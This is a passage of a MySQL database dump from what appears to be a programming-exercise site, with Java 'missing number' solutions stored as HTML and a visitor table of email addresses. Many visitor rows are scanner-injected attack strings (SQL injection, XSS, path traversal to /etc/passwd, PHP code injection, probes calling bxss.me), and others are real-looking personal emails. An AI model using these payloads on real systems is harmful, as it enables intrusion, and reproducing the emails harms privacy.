normal;\"><span style=\"white-space:pre\">			</span>arr[i] = input.nextInt();</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>}</span></p><p><br></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>Arrays.sort(arr);</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>if(arr[0] != 1)</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>System.out.print(1);<span style=\"white-space:pre\">	</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>}</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>else</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>for(int i = 1; i&lt;n; i++)</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>{</span></p><p><span style=\"white-space: pre; white-space: normal;\">			</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">				</span>if(arr[i]!=arr[i-1]+1 &amp;&amp; arr[i]!=arr[i-1])</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">				</span>{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">					</span>System.out.print(arr[i-1]+1);<span style=\"white-space:pre\">	</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">					</span>bool = 1;</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">					</span>break;</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">				</span>}</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>}</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>}</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>if(bool==0)</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>System.out.print(arr[n-1]+1);</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>}</span></p><p><span style=\"white-space: pre; white-space: normal;\">	</span></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p>&nbsp; &nbsp; &nbsp; <span style=\"white-space:pre\">	</span>}</p><p>}</p>',NULL,'',32,'','',''),(1138,'Find the Missing Number in Array 3','find-the-missing-number-in-array-3','<p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span lang=\"EN-US\">Get an array of Integers <i>arr[]</i>\r\nwith size <i>n</i> and find the first\r\nmissing number in the array <i>arr[]. Assume\r\nthe array starts with smallest number and ends with greatest number. So find\r\nthe missing number between smallest to greatest. Return 0 if no missing number\r\nfound. Array may contains duplicates numbers. </i></span><span style=\"font-size:13.0pt;color:black\"><o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align:justify\"><span lang=\"EN-US\" style=\"font-size:12.0pt;line-height:115%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-ansi-language:EN-US\">Example<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"color:black\">Input 1:<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"color:black\">5 <o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"color:black\">12 10 9 7 11 <o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"color:black\">Output 1:<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"color:black\">8<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"color:black\">Input 1:<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"color:black\">6 <o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"color:black\">4 5 7 8 6 9<o:p></o:p></span></p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"color:black\">Output 1:<o:p></o:p></span></p><p>\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n</p><p style=\"margin: 0cm 0cm 7.5pt; text-align: justify; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><span style=\"color:black\">0</span><span lang=\"EN-US\"><o:p></o:p></span></p>','B','<p>import java.util.*;</p><p>class Missing_Number2</p><p>{</p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">	</span>public static void main(String args[])</span></p><p>&nbsp; &nbsp; <span style=\"white-space:pre\">	</span>{</p><p><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>//Variable and&nbsp; Object Declarations</span></p><p>&nbsp; &nbsp; &nbsp; &nbsp;<span style=\"white-space:pre\">		</span>Scanner input = new Scanner(System.in);</p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>int n,bool=0;</span></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>//Getting size of Array &amp; Declare Array arr[]</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>n = input.nextInt();</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>int arr[] = new int[n];</span></p><p><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>//Get n values to array arr[]</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>for(int i = 0; i&lt;n; i++)</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>arr[i] = input.nextInt();</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>}</span></p><p><br></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>Arrays.sort(arr);</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>for(int i = 1; i&lt;n; i++)</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>{</span></p><p><span style=\"white-space: pre; white-space: normal;\">			</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>if(arr[i]!=arr[i-1]+1 &amp;&amp; arr[i]!=arr[i-1])</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">				</span>System.out.print(arr[i-1]+1);<span style=\"white-space:pre\">	</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">				</span>bool = 1;</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">				</span>break;</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>}</span></p><p><span style=\"white-space: pre; white-space: normal;\">			</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>}</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>if(bool==0)</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>System.out.print(0);</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>}</span></p><p><span style=\"white-space: pre; white-space: normal;\">	</span></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p>&nbsp; &nbsp; &nbsp; <span style=\"white-space:pre\">	</span>}</p><p>}</p>',NULL,'',32,'','','');
/*!40000 ALTER TABLE `example_app_program` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `example_app_visitor`
--

DROP TABLE IF EXISTS `example_app_visitor`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `example_app_visitor` (
  `id` int NOT NULL AUTO_INCREMENT,
  `email` varchar(100) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=345 DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `example_app_visitor`
--

LOCK TABLES `example_app_visitor` WRITE;
/*!40000 ALTER TABLE `example_app_visitor` DISABLE KEYS */;
INSERT INTO `example_app_visitor` VALUES (2,'1'),(3,'sanjaykumarkushwaha5000@gmail.com'),(4,'hevindiranasingha@gmail.com'),(5,'Priyankakachhawa70@gmail.com'),(6,'\')--#'),(7,'\"><script>'),(8,'\"</a><script>'),(272,'1<esi:include src=\"http://bxss.me/rpb.png\"/>'),(10,'\'><ScRiPt>'),(11,'\'</ScRiPt><ScRiPt>;alert(31337);</ScRiPt>'),(12,'\"<ScRiPt>;alert(31337);</ScRiPt><ScRiPt>'),(13,'\"}`)<script>alert(22222222222)</script><script>alert(\'we are back!\')</script>'),(14,'\"<ScRiPt>;alert(31337);</ScRiPt>'),(15,'../../../../../etc/passwd'),(16,'....//....//....//etc//passwd'),(17,'..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\boot.ini'),(18,'....\\....\\....\\....\\windows\\boot.ini'),(19,'/etc/passwd'),(20,'C:\\windows\\win.ini'),(21,'..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd'),(22,'....%2F%2F....%2F%2F....%2F%2Fetc%2F%2Fpasswd'),(23,'..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cboot.ini'),(24,'....%5C....%5C....%5C....%5Cwindows%5Cboot.ini'),(25,'%2Fetc%2Fpasswd'),(26,'C%3A%5Cwindows%5Cwin.ini'),(27,'mnvicky04@gmail.com'),(28,'kumaran853.b@gmail.com'),(29,'silentboy1012000@gmail.com'),(30,'nahi.mumtaj@g.bracu.ac.bd'),(31,'ajeenachu145@gmail.com'),(32,'snehasnehadravid@gmail.com'),(33,'vamsigajjala2002@gmail.com'),(34,'khalifabi2004@gmail.com'),(35,'deepikarachamalla12@gmail.com'),(36,'venusurada143@gmail.com'),(37,'sanjaivinayak@gmail.com'),(38,'1516'),(39,'4581'),(40,'1(\'(,.((\'.\''),(41,'2878-2877'),(42,'1.4vmxy'),(43,'1\'OcfldH<\'\">XQvqdB'),(44,'1) AND 3014=2502 AND (1491=1491'),(45,'1) AND 1225=1225 AND (6858=6858'),(46,'1 AND 5747=4936'),(47,'1 AND 1225=1225'),(48,'1 AND 4510=9345-- KXYB'),(49,'1 AND 1225=1225-- KQDe'),(50,'1\') AND 3929=5800 AND (\'cMCv\'=\'cMCv'),(51,'1\') AND 1225=1225 AND (\'wFnr\'=\'wFnr'),(52,'1\' AND 1180=2670 AND \'IZIl\'=\'IZIl'),(53,'1\' AND 1225=1225 AND \'Poni\'=\'Poni'),(54,'1%\' AND 5392=2636 AND \'%\'=\''),(55,'1%\' AND 1225=1225 AND \'%\'=\''),(56,'(SELECT CONCAT(0x7176786b71,(SELECT (ELT(2429=2429,1))),0x7178626b71))'),(57,'1);SELECT SLEEP(5)#'),(58,'1;SELECT SLEEP(5)#'),(59,'1\');SELECT SLEEP(5)#'),(60,'1\';SELECT SLEEP(5)#'),(61,'1%\';SELECT SLEEP(5)#'),(62,'1);SELECT PG_SLEEP(5)--'),(63,'1;SELECT PG_SLEEP(5)--'),(64,'1\');SELECT PG_SLEEP(5)--'),(65,'1\';SELECT PG_SLEEP(5)--'),(66,'1%\';SELECT PG_SLEEP(5)--'),(67,'1);WAITFOR DELAY \'0:0:5\'--'),(68,'1;WAITFOR DELAY \'0:0:5\'--'),(69,'1\');WAITFOR DELAY \'0:0:5\'--'),(70,'1\';WAITFOR DELAY \'0:0:5\'--'),(71,'1%\';WAITFOR DELAY \'0:0:5\'--'),(72,'1);SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(100)||CHR(77)||CHR(84)||CHR(85),5) FROM DUAL--'),(73,'1;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(100)||CHR(77)||CHR(84)||CHR(85),5) FROM DUAL--'),(74,'1\');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(100)||CHR(77)||CHR(84)||CHR(85),5) FROM DUAL--'),(75,'1\';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(100)||CHR(77)||CHR(84)||CHR(85),5) FROM DUAL--'),(76,'1%\';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(100)||CHR(77)||CHR(84)||CHR(85),5) FROM DUAL--'),(77,'1) AND SLEEP(5) AND (4264=4264'),(78,'1 AND SLEEP(5)'),(79,'1 AND SLEEP(5)-- ccYQ'),(80,'1\') AND SLEEP(5) AND (\'xrAv\'=\'xrAv'),(81,'1\' AND SLEEP(5) AND \'vgMl\'=\'vgMl'),(82,'1%\' AND SLEEP(5) AND \'%\'=\''),(83,'1) AND 4277=(SELECT 4277 FROM PG_SLEEP(5)) AND (4124=4124'),(84,'1 AND 4277=(SELECT 4277 FROM PG_SLEEP(5))'),(85,'1 AND 4277=(SELECT 4277 FROM PG_SLEEP(5))-- oGdb'),(86,'1\') AND 4277=(SELECT 4277 FROM PG_SLEEP(5)) AND (\'OBar\'=\'OBar'),(87,'1\' AND 4277=(SELECT 4277 FROM PG_SLEEP(5)) AND \'lgBP\'=\'lgBP'),(88,'1%\' AND 4277=(SELECT 4277 FROM PG_SLEEP(5)) AND \'%\'=\''),(89,'1) WAITFOR DELAY \'0:0:5\' AND (7688=7688'),(90,'1 WAITFOR DELAY \'0:0:5\''),(91,'1 WAITFOR DELAY \'0:0:5\'-- fiWd'),(92,'1\') WAITFOR DELAY \'0:0:5\' AND (\'fMib\'=\'fMib'),(93,'1\' WAITFOR DELAY \'0:0:5\' AND \'GqzZ\'=\'GqzZ'),(94,'1%\' WAITFOR DELAY \'0:0:5\' AND \'%\'=\''),(95,'1) AND 7561=DBMS_PIPE.RECEIVE_MESSAGE(CHR(86)||CHR(84)||CHR(67)||CHR(71),5) AND (7649=7649'),(96,'1 AND 7561=DBMS_PIPE.RECEIVE_MESSAGE(CHR(86)||CHR(84)||CHR(67)||CHR(71),5)'),(97,'1 AND 7561=DBMS_PIPE.RECEIVE_MESSAGE(CHR(86)||CHR(84)||CHR(67)||CHR(71),5)-- aQcE'),(98,'1\') AND 7561=DBMS_PIPE.RECEIVE_MESSAGE(CHR(86)||CHR(84)||CHR(67)||CHR(71),5) AND (\'wNcT\'=\'wNcT'),(99,'1\' AND 7561=DBMS_PIPE.RECEIVE_MESSAGE(CHR(86)||CHR(84)||CHR(67)||CHR(71),5) AND \'tUwy\'=\'tUwy'),(100,'1%\' AND 7561=DBMS_PIPE.RECEIVE_MESSAGE(CHR(86)||CHR(84)||CHR(67)||CHR(71),5) AND \'%\'=\''),(101,'1) ORDER BY 1-- ftHn'),(102,'1) UNION ALL SELECT NULL-- yfaX'),(103,'1) UNION ALL SELECT NULL,NULL-- DtzR'),(104,'1) UNION ALL SELECT NULL,NULL,NULL-- AuNI'),(105,'1) UNION ALL SELECT NULL,NULL,NULL,NULL-- dikD'),(106,'1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- KUuo'),(107,'1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- pFer'),(108,'1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- IalE'),(109,'1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- WrID'),(110,'1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ErGo'),(111,'1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- uDFP'),(112,'1 ORDER BY 1-- bzyl'),(113,'1 UNION ALL SELECT NULL-- UkNo'),(114,'1 UNION ALL SELECT NULL,NULL-- IRhJ'),(115,'1 UNION ALL SELECT NULL,NULL,NULL-- oBRZ'),(116,'1 UNION ALL SELECT NULL,NULL,NULL,NULL-- TkhH'),(117,'1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- GyaI'),(118,'1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- QZVd'),(119,'1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- tqnt'),(120,'1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- mcxc'),(121,'1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- IOAE'),(122,'1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- WpMF'),(123,'1 ORDER BY 1-- YbDY'),(124,'1 UNION ALL SELECT NULL-- KdyP'),(125,'1 UNION ALL SELECT NULL,NULL-- wYpy'),(126,'1 UNION ALL SELECT NULL,NULL,NULL-- Joio'),(127,'1 UNION ALL SELECT NULL,NULL,NULL,NULL-- qIdF'),(128,'1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- qXqS'),(129,'1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- cLVX'),(130,'1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ysuW'),(131,'1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- XrBq'),(132,'1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- HtYT'),(133,'1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UaXW'),(134,'1\') ORDER BY 1-- xgMd'),(135,'1\') UNION ALL SELECT NULL-- LdYZ'),(136,'1\') UNION ALL SELECT NULL,NULL-- dSGD'),(137,'1\') UNION ALL SELECT NULL,NULL,NULL-- IfYd'),(138,'1\') UNION ALL SELECT NULL,NULL,NULL,NULL-- BLfW'),(139,'1\') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- yXjY'),(140,'1\') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- Oqyp'),(141,'1\') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- aJLv'),(142,'1\') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ckds'),(143,'1\') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UllV'),(144,'1\') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- mlNZ'),(145,'1\' ORDER BY 1-- vABJ'),(146,'1\' UNION ALL SELECT NULL-- gDoM'),(147,'1\' UNION ALL SELECT NULL,NULL-- CeAX'),(148,'1\' UNION ALL SELECT NULL,NULL,NULL-- WSBB'),(149,'1\' UNION ALL SELECT NULL,NULL,NULL,NULL-- rbuF'),(150,'1\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- yoVN'),(151,'1\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- Afmi'),(152,'1\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- PyGB'),(153,'1\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- osjc'),(154,'1\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- eqxT'),(155,'1\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- AMIk'),(156,'1%\' ORDER BY 1-- QEsz'),(157,'1%\' UNION ALL SELECT NULL-- Yaog'),(158,'1%\' UNION ALL SELECT NULL,NULL-- vFuJ'),(159,'1%\' UNION ALL SELECT NULL,NULL,NULL-- gRGB'),(160,'1%\' UNION ALL SELECT NULL,NULL,NULL,NULL-- Bzmd'),(161,'1%\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- ApXH'),(162,'1%\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- wCYF'),(163,'1%\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- mVUb'),(164,'1%\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- neYu'),(165,'1%\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- JzSp'),(166,'1%\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- IBYx'),(167,'1) ORDER BY 1#'),(168,'1) UNION ALL SELECT NULL#'),(169,'1) UNION ALL SELECT NULL,NULL#'),(170,'1) UNION ALL SELECT NULL,NULL,NULL#'),(171,'1) UNION ALL SELECT NULL,NULL,NULL,NULL#'),(172,'1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#'),(173,'1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#'),(174,'1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#'),(175,'1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#'),(176,'1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#'),(177,'1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#'),(178,'1 ORDER BY 1#'),(179,'1 UNION ALL SELECT NULL#'),(180,'1 UNION ALL SELECT NULL,NULL#'),(181,'1 UNION ALL SELECT NULL,NULL,NULL#'),(182,'1 UNION ALL SELECT NULL,NULL,NULL,NULL#'),(183,'1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#'),(184,'1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#'),(185,'1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#'),(186,'1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#'),(187,'1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#'),(188,'1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#'),(189,'1 ORDER BY 3713#'),(190,'1 ORDER BY 10#'),(191,'1 ORDER BY 6#'),(192,'1 ORDER BY 4#'),(193,'1 ORDER BY 3#'),(194,'1 ORDER BY 2#'),(195,'1 UNION ALL SELECT CONCAT(0x7176786b71,0x46684179427649734544,0x7178626b71)#'),(196,'-1200 UNION ALL SELECT CONCAT(0x7176786b71,0x635a4e4e4e6378724e75,0x7178626b71)#'),(197,'1\') UNION ALL SELECT CONCAT(0x7176786b71,0x4b4743794848456e4a49,0x7178626b71)#'),(198,'-5701\') UNION ALL SELECT CONCAT(0x7176786b71,0x61697a476c696d6c5a59,0x7178626b71)#'),(199,'1\' UNION ALL SELECT CONCAT(0x7176786b71,0x494570636d4f4872514d,0x7178626b71)#'),(200,'-4675\' UNION ALL SELECT CONCAT(0x7176786b71,0x7150426e7950706a7a78,0x7178626b71)#'),(201,'1%\' UNION ALL SELECT CONCAT(0x7176786b71,0x4c4d5171426f6e514f67,0x7178626b71)#'),(202,'-1450%\' UNION ALL SELECT CONCAT(0x7176786b71,0x537561566d666a684b63,0x7178626b71)#'),(203,'kingsleyalpha730@gmail.com'),(204,'ritikvishwakarma553@gmail.com'),(205,'kelvinnyale780@gmail.com'),(206,'21mea02@gmail.com'),(207,'21mea02@karpagamtech.ac.in'),(208,'21mea21@karpagamtech.ac.in'),(209,'21ita62.karpagamtech@gmail.com'),(210,'nadeem1234@gmail.com'),(211,'sivabal623@gamil.com'),(212,'21mea22@karpagam.ac.in'),(213,'shanmugavelsaran3@gmail.com'),(214,'danitwize@gmail.com'),(215,'Wenslausogwanga@gmail.com'),(216,'mofiali@gmail.com'),(217,'chirantan@learningpeople.in'),(218,'bonybaidrax@gmail.com'),(219,'2023'),(220,'2022'),(221,'mulikpallavi273@gmail.com'),(222,'trongnm1208@gmail.com'),(223,'info@arunkumar.com'),(224,'bodavineela@gmail.com'),(225,'ygX2kGeY'),(226,'1*1'),(227,'1*251*246*0'),(228,'(257-251-5)'),(229,'1*99*94*0'),(230,'(105-99-5)'),(231,'1*592*587*0'),(232,'(598-592-5)'),(233,'-1 OR 2+196-196-1=0+0+0+1'),(234,'-1 OR 3+196-196-1=0+0+0+1'),(235,'if(now()=sysdate(),sleep(15),0)'),(236,'0\'XOR(if(now()=sysdate(),sleep(15),0))XOR\'Z'),(237,'0\"XOR(if(now()=sysdate(),sleep(15),0))XOR\"Z'),(238,'-1; waitfor delay \'0:0:15\' -- '),(239,'-1); waitfor delay \'0:0:15\' -- '),(240,'1 waitfor delay \'0:0:15\' -- '),(241,'0D5NPyVm\'; waitfor delay \'0:0:15\' -- '),(242,'-5 OR 89=(SELECT 89 FROM PG_SLEEP(15))--'),(243,'-5) OR 813=(SELECT 813 FROM PG_SLEEP(15))--'),(244,'-1)) OR 313=(SELECT 313 FROM PG_SLEEP(15))--'),(245,'wdg0THBt\' OR 42=(SELECT 42 FROM PG_SLEEP(15))--'),(246,'3tU7LEM9\') OR 302=(SELECT 302 FROM PG_SLEEP(15))--'),(247,'yOF9IGzo\')) OR 885=(SELECT 885 FROM PG_SLEEP(15))--'),(248,'1*DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(99)||CHR(99),15)'),(249,'1\'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||\''),(250,'1\'\"'),(251,'1\0����%2527%2522'),(252,'@@QTSUB'),(253,'NTN6std4'),(254,'1*435*430*0'),(255,'(441-435-5)'),(256,'1*973*968*0'),(257,'(979-973-5)'),(258,'1*85*80*0'),(259,'(91-85-5)'),(260,'1*917*912*0'),(261,'(923-917-5)'),(262,'-1 OR 2+622-622-1=0+0+0+1'),(263,'-1 OR 3+622-622-1=0+0+0+1'),(264,'ocn4WTG7\'; waitfor delay \'0:0:15\' -- '),(265,'-5 OR 669=(SELECT 669 FROM PG_SLEEP(15))--'),(266,'-5) OR 507=(SELECT 507 FROM PG_SLEEP(15))--'),(267,'-1)) OR 158=(SELECT 158 FROM PG_SLEEP(15))--'),(268,'ZXUsVDeb\' OR 456=(SELECT 456 FROM PG_SLEEP(15))--'),(269,'bnlBxF3Y\') OR 667=(SELECT 667 FROM PG_SLEEP(15))--'),(270,'pNqm27sD\')) OR 58=(SELECT 58 FROM PG_SLEEP(15))--'),(271,'@@PwO76'),(273,'${9999104+10000267}'),(274,'4VAJbMfg'),(275,'Bcb878DC: CPoHxiiV'),(276,'response.write(9825293*9983774)'),(277,')'),(278,'1&n947301=v959320'),(279,'\'+response.write(9825293*9983774)+\''),(280,'!(()&&!|*|*|'),(281,'\"+response.write(9825293*9983774)+\"'),(282,'^(#$!@#$)(()))******'),(283,'\'\"'),(284,'xfs.bxss.me'),(285,'../../../../../../../../../../../../../../etc/passwd'),(286,'../../../../../../../../../../../../../../windows/win.ini'),(287,'<!--'),(288,')))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))'),(289,'file:///etc/passwd'),(290,'index.php'),(291,'../1'),(292,'http://dicrpdbjmemujemfyopp.zzz/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs?.jpg'),(293,'./1'),(294,'index.php/.'),(295,'1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs\0.jpg'),(296,'Http://bxss.me/t/fit.txt'),(297,'http://bxss.me/t/fit.txt?.jpg'),(298,';assert(base64_decode(\'cHJpbnQobWQ1KDMxMzM3KSk7\'));'),(299,'/etc/shells'),(300,'../../../../../../../../../../../../../../etc/shells'),(301,'\';print(md5(31337));$a=\''),(302,'c:/windows/win.ini'),(303,'\";print(md5(31337));$a=\"'),(304,'bxss.me'),(305,'${@print(md5(31337))}'),(306,'${@print(md5(31337))}\\'),(307,'\'\"()'),(308,'1\'&&sleep(27*1000)*qkbjiq&&\''),(309,'1\"&&sleep(27*1000)*bnecmy&&\"'),(310,'\'.print(md5(31337)).\''),(311,'1\'||sleep(27*1000)*ajlnnz||\''),(312,'1\